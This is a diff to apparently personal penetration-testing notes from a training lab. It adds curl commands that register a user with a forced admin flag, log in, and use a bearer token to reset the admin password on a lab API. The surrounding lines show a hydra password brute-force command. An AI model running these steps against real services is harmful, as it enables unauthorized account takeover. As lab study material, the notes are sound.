@@ -79,6 +79,21 @@ Apis can listen to POST requests as GET requests
 ```bash
 gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
 ```
+
+#### Example
+
+```bash
+curl -i http://192.168.50.16:5002/users/v1/admin/password
+curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register
+curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
+curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+curl -X 'PUT' \
+  'http://192.168.50.16:5002/users/v1/admin/password' \
+  -H 'Content-Type: application/json' \
+  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
+  -d '{"password": "pwned"}'
+curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
+```
 # Exploitation
 
 Based in all these findings we can search exploits by:
@@ -92,3 +107,5 @@ Based in all these findings we can search exploits by:
 ```bash
 hydra -l user -P /usr/share/wordlists/rockyou.txt <192.168.50.201> http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
 ```
+
+### API
